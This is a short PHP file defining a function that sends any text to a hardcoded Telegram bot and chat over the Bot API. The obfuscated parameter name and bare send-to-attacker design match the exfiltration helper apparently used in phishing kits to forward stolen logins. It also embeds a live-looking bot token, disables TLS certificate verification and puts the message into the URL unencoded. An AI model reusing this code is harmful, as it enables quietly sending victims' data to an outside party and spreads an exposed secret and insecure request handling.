<?php

function telegram_send($DAk89) {
    $curl = curl_init();
    $api_key  = '6809910911:AAFJk0O8eBn1dbVdpCyqyRGT88aBU2DntFM';
    $chat_id  = '6548994153';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $DAk89 .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

?>